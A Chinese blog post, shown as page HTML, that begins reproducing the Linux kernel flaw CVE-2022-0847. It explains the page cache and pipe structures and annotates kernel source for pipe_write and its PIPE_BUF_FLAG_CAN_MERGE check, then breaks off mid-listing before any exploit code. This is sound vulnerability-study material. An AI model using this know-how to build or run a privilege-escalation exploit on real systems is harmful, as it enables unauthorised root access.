

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="peiwithhao">
  <meta name="keywords" content="">
  
    <meta name="description" content="In fact, all the boring normal bugs are _way_ more important, just because there&#39;s a lot more of them. I don&#39;t think some spectacular security hole should be glorified or cared about as being any more">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2022-0847漏洞复现">
<meta property="og:url" content="https://peiandhao.github.io/2024/05/15/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="peiwithhao&#39;s Valhalla">
<meta property="og:description" content="In fact, all the boring normal bugs are _way_ more important, just because there&#39;s a lot more of them. I don&#39;t think some spectacular security hole should be glorified or cared about as being any more">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://peiandhao.github.io/img/CVE-2022-0847.png">
<meta property="article:published_time" content="2024-05-15T07:06:24.000Z">
<meta property="article:modified_time" content="2024-05-15T07:56:19.329Z">
<meta property="article:author" content="peiwithhao">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="Kernel">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://peiandhao.github.io/img/CVE-2022-0847.png">
  
  
  
  <title>CVE-2022-0847漏洞复现 - peiwithhao&#39;s Valhalla</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"peiandhao.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"text"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","app_key":"Vr60qrZIptqhJaXqWvDEknkH","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>p3ivv1+h@0</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/CVE-2022-0847.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2022-0847漏洞复现"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        peiwithhao
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-05-15 15:06" pubdate>
          2024年5月15日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          23k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          192 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">CVE-2022-0847漏洞复现</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="CVE-2022-0847漏洞复现"><a href="#CVE-2022-0847漏洞复现" class="headerlink" title="CVE-2022-0847漏洞复现"></a>CVE-2022-0847漏洞复现</h1><h1 id="page-cache"><a href="#page-cache" class="headerlink" title="page cache"></a>page cache</h1><p>首先取自linux官方文档对于page cache的解释</p>
<blockquote>
<p>物理内存是易失性的，将数据导入内存的常见情况是从文件中读取数据。每当读取文件时，数据都会放入page cache中，以避免在后续读取时进行昂贵的磁盘访问。同样，当写入文件时，数据被放置在page cache中，并最终进入后备存储设备。写入的页面被标记为脏页面，当 Linux 决定将它们重用于其他目的时，它会确保将设备上的文件内容与更新的数据同步。</p>
</blockquote>
<p><img src="https://pic2.zhimg.com/80/v2-1fff8af2d8099698f96977884087d251_720w.jpg" srcset="/img/loading.gif" lazyload></p>
<h1 id="pipe系列"><a href="#pipe系列" class="headerlink" title="pipe系列"></a>pipe系列</h1><p>在我们申请到一个pipe管道后,他们在内存当中大致呈以下局面</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs text">                                                         struct file<br>                                                     +----------------+<br>                                                     |                |<br>                                          +---------&gt;|                |<br>                                          |          +----------------+<br>                                          |          | *private_data  +-----------------------------------+<br>                                          |          |                |                                   |<br>                                          |          +----------------+                                   |<br>                                          |     +----+      *f_op     |                                   |<br>                                          |     |    |                |                                   |<br>                                          |     |    +----------------+                                   |<br>     Userland                             |     |    |    *f_inode    +--+                                |     struct pipe_inode_info<br>                                          |     |    |                |  |                                |<br>+-----------------+-----------------+     |     |    +----------------+  |    struct inode                |        +------------+<br>|      fd[0]      |     files[0]    +-----+     |    |                |  +--&gt;+------------+               +-------&gt;|            |           +-------------+<br>|                 |       read      |           |    +----------------+  |   |   *i_op    +----+          |        +------------+      +---&gt;| pipe_buffer |<br>+-----------------+-----------------+           |                        |   |            |    |          |        |            |      |    +-------------+<br>|      fd[1]      |     files[1]    +-----+     |                        |   +------------+    |          |        +------------+      |    | pipe_buffer |<br>|                 |       write     |     |     |        struct file     |   |   ......   |    |          |        |            |      |    +-------------+<br>+-----------------+-----------------+     |     |    +----------------+  |   |            |    |          |        +------------+      |    | ........... |<br>                                          +-----|---&gt;|                |  |   +------------+    |          |        |   *bufs    +------+    +-------------+<br>                                                |    |                |  |   |   i_pipe   +----|----------+        +------------+           | pipe_buffer |<br>                                                |    +----------------+  |   |            |    |                   |            |           +-------------+<br>                                                |    | *private_data  |  |   +------------+    |                   +------------+<br>                                                |    |                |  |   |   ......   |    |                   +------------+<br>                                                |    +----------------+  |   |            |    |<br>                                                +----+      *f_op     |  |   +------------+    |<br>                                                |    |                |  |                     |<br>                                                |    +----------------+  |                     |            +------------------------------------------------+<br>                                                |    |    *f_inode    |  |                     |            | const struct file_operations pipefifo_fops = &#123; |<br>                                                |    |                +--+                     |            |     .open       = fifo_open,                   |<br>                                                |    +----------------+                        |            |     .llseek     = no_llseek,                   |<br>                                                |    |                |                        |            |     .read_iter  = pipe_read,                   |<br>                                                |    +----------------+                  +-----+------------+     .write_iter = pipe_write,                  |<br>                                                |                                        |                  |     .poll       = pipe_poll,                   |<br>                                                |                                        |                  |     .unlocked_ioctl = pipe_ioctl,              |<br>                                                |                                        |                  |     .release    = pipe_release,                |<br>                                                |                                        |                  |     .fasync     = pipe_fasync,                 |<br>                                                |                                        |                  |     .splice_write   = iter_file_splice_write,  |<br>                                                +----------------------------------------+                  | &#125;;                                             |<br>                                                                                                            +------------------------------------------------+<br><br></code></pre></td></tr></table></figure>

<h2 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h2><p>位于 <code>fs/pipe.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">58</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br><span class="hljs-number">59</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br><span class="hljs-number">60</span>     <span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br><span class="hljs-number">61</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head; 			<span class="hljs-comment">//写入pipe时所指向的bufs的下标</span><br><span class="hljs-number">62</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail; 			<span class="hljs-comment">//读出pipe时所指向的bufs的下标</span><br><span class="hljs-number">63</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage; 	<span class="hljs-comment">//bufs最多包含的pipe_buffer</span><br><span class="hljs-number">64</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size; 	<span class="hljs-comment">//目前总共的pipe_buffer数量,默认0x10,可以通过fcntl(F_SETPIPE_SZ)进行修改,但是需为2的幂次</span><br><span class="hljs-number">65</span> <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-number">66</span>     <span class="hljs-type">bool</span> note_loss;<br><span class="hljs-number">67</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-number">68</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted; 	<br><span class="hljs-number">69</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers; 		<span class="hljs-comment">//目前读者数目</span><br><span class="hljs-number">70</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers; 		<span class="hljs-comment">//目前写者数目</span><br><span class="hljs-number">71</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files; 		<span class="hljs-comment">//映射到该pipe_inode_info的file数目</span><br><span class="hljs-number">72</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br><span class="hljs-number">73</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;                                                                         <br><span class="hljs-number">74</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> poll_usage;<br><span class="hljs-number">75</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br><span class="hljs-number">76</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br><span class="hljs-number">77</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br><span class="hljs-number">78</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span> 	<span class="hljs-comment">//struct pipe_buffer数组</span><br><span class="hljs-number">79</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span> 	<span class="hljs-comment">//创建该pipe的用户</span><br><span class="hljs-number">80</span> <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-number">81</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-number">82</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-number">83</span> &#125;;<br></code></pre></td></tr></table></figure>

<h2 id="pipefifo-fops"><a href="#pipefifo-fops" class="headerlink" title="pipefifo_fops"></a>pipefifo_fops</h2><p>位于 <code>fs/pipe.c</code>,这里是pipe管道文件对应的虚函数表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1218</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br><span class="hljs-number">1219</span>     .open       = fifo_open,<br><span class="hljs-number">1220</span>     .llseek     = no_llseek,<br><span class="hljs-number">1221</span>     .read_iter  = pipe_read,                                                           <br><span class="hljs-number">1222</span>     .write_iter = pipe_write,<br><span class="hljs-number">1223</span>     .poll       = pipe_poll,<br><span class="hljs-number">1224</span>     .unlocked_ioctl = pipe_ioctl,<br><span class="hljs-number">1225</span>     .release    = pipe_release,<br><span class="hljs-number">1226</span>     .fasync     = pipe_fasync,<br><span class="hljs-number">1227</span>     .splice_write   = iter_file_splice_write,<br><span class="hljs-number">1228</span> &#125;;  <br></code></pre></td></tr></table></figure>



<h2 id="pipe-write"><a href="#pipe-write" class="headerlink" title="pipe_write"></a>pipe_write</h2><p>一步一步分析pipe_write</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">415</span> <span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-number">416</span> pipe_write(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *from)                                  <br><span class="hljs-number">417</span> &#123;   <br><span class="hljs-number">418</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br><span class="hljs-number">419</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-number">420</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-number">421</span>     <span class="hljs-type">ssize_t</span> ret = <span class="hljs-number">0</span>;<br><span class="hljs-number">422</span>     <span class="hljs-type">size_t</span> total_len = iov_iter_count(from);<br><span class="hljs-number">423</span>     <span class="hljs-type">ssize_t</span> chars;<br><span class="hljs-number">424</span>     <span class="hljs-type">bool</span> was_empty = <span class="hljs-literal">false</span>;<br><span class="hljs-number">425</span>     <span class="hljs-type">bool</span> wake_next_writer = <span class="hljs-literal">false</span>;<br>......<br><span class="hljs-number">446</span>     <span class="hljs-comment">/*</span><br><span class="hljs-comment">447      * If it wasn&#x27;t empty we try to merge new data into</span><br><span class="hljs-comment">448      * the last buffer.</span><br><span class="hljs-comment">449      *</span><br><span class="hljs-comment">450      * That naturally merges small writes, but it also</span><br><span class="hljs-comment">451      * page-aligns the rest of the writes for large writes</span><br><span class="hljs-comment">452      * spanning multiple pages.</span><br><span class="hljs-comment">453      */</span><br><span class="hljs-number">454</span>     head = pipe-&gt;head;<br><span class="hljs-number">455</span>     was_empty = pipe_empty(head, pipe-&gt;tail); 	<span class="hljs-comment">//判断pipe是否现在内容为空</span><br><span class="hljs-number">456</span>     chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>); <span class="hljs-comment">//total_len为我们想总共写入的字节数</span><br><span class="hljs-number">457</span>     <span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123; 		<span class="hljs-comment">//当为空就不会走这里,这里是如果本次指向的head还有空闲空间,则会用它来进行写入</span><br><span class="hljs-number">458</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>; <br><span class="hljs-number">459</span>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<br><span class="hljs-number">460</span>         <span class="hljs-type">int</span> offset = buf-&gt;offset + buf-&gt;len; 	<span class="hljs-comment">//偏移是指该pipe_buffer所指向的page页面中的偏移,这里再加上len就可以得到即将写入的位置</span><br><span class="hljs-number">461</span> <br><span class="hljs-number">462</span>         <span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br><span class="hljs-number">463</span>             offset + chars &lt;= PAGE_SIZE) &#123;<br><span class="hljs-number">464</span>             ret = pipe_buf_confirm(pipe, buf);<br><span class="hljs-number">465</span>             <span class="hljs-keyword">if</span> (ret)<br><span class="hljs-number">466</span>                 <span class="hljs-keyword">goto</span> out;<br><span class="hljs-number">467</span> <br><span class="hljs-number">468</span>             ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<br><span class="hljs-number">469</span>             <span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br><span class="hljs-number">470</span>                 ret = -EFAULT;<br><span class="hljs-number">471</span>                 <span class="hljs-keyword">goto</span> out;<br><span class="hljs-number">472</span>             &#125;<br><span class="hljs-number">473</span> <br><span class="hljs-number">474</span>             buf-&gt;len += ret; 		<span class="hljs-comment">//这里将len+我们刚刚写入的值</span><br><span class="hljs-number">475</span>             <span class="hljs-keyword">if</span> (!iov_iter_count(from))<br><span class="hljs-number">476</span>                 <span class="hljs-keyword">goto</span> out;<br><span class="hljs-number">477</span>         &#125;<br><span class="hljs-number">478</span>     &#125;<br><br></code></pre></td></tr></table></figure>

<p>简述一下上面的步骤:</p>
<ol>
<li>检查整个pipe所指向buffer的空间,这里检查我们想要传入的总字节数 <code>total_size</code>,然后计算 <code>chars</code>,这里是总字节相对于pagesize取余数</li>
<li>这里来判断offset + chars会不会超过该head buffer所指向的页面界限,并且判断buf-&gt;flags是否带有 <code>PIPE_BUF_FLAG_CAN_MERGE</code>参数,满足两个条件就进行下面buffer的复制</li>
</ol>
<p>然后如果没有进行一个初始的边角料拷贝,或者说拷完了,下面的代码继续运行,是一个大的for循环</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">480</span>     <span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-number">481</span>         <span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br><span class="hljs-number">482</span>             send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br><span class="hljs-number">483</span>             <span class="hljs-keyword">if</span> (!ret)<br><span class="hljs-number">484</span>                 ret = -EPIPE;<br><span class="hljs-number">485</span>             <span class="hljs-keyword">break</span>;<br><span class="hljs-number">486</span>         &#125;<br><span class="hljs-number">487</span> <br><span class="hljs-number">488</span>         head = pipe-&gt;head;<br>				<span class="hljs-comment">/* 查看是否bufs是否已经用完,为用完则进入if的内容,否则跳过过 */</span><br><span class="hljs-number">489</span>         <span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123; 	<br><span class="hljs-number">490</span>             <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-number">491</span>             <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];  <span class="hljs-comment">//获取写入的bufs数组下标                      </span><br><span class="hljs-number">492</span>             <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><span class="hljs-number">493</span>             <span class="hljs-type">int</span> copied;<br><span class="hljs-number">494</span> <br><span class="hljs-number">495</span>             <span class="hljs-keyword">if</span> (!page) &#123;<br><span class="hljs-number">496</span>                 page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT); 	<span class="hljs-comment">//如果pipe没有cache页面,则分配</span><br><span class="hljs-number">497</span>                 <span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br><span class="hljs-number">498</span>                     ret = ret ? : -ENOMEM;<br><span class="hljs-number">499</span>                     <span class="hljs-keyword">break</span>;<br><span class="hljs-number">500</span>                 &#125;<br><span class="hljs-number">501</span>                 pipe-&gt;tmp_page = page;<br><span class="hljs-number">502</span>             &#125;<br><span class="hljs-number">503</span> <br><span class="hljs-number">504</span>             <span class="hljs-comment">/* 在 bufs ring中分配一个slot并且连接在空的pipe_buffer上</span><br><span class="hljs-comment">505              * If we fault or otherwise fail to use</span><br><span class="hljs-comment">506              * it, either the reader will consume it or it&#x27;ll still</span><br><span class="hljs-comment">507              * be there for the next write.</span><br><span class="hljs-comment">508              */</span><br><span class="hljs-number">509</span>             spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-number">510</span> <br><span class="hljs-number">511</span>             head = pipe-&gt;head;<br><span class="hljs-number">512</span>             <span class="hljs-keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br><span class="hljs-number">513</span>                 spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-number">514</span>                 <span class="hljs-keyword">continue</span>;<br><span class="hljs-number">515</span>             &#125;<br><span class="hljs-number">516</span> <br><span class="hljs-number">517</span>             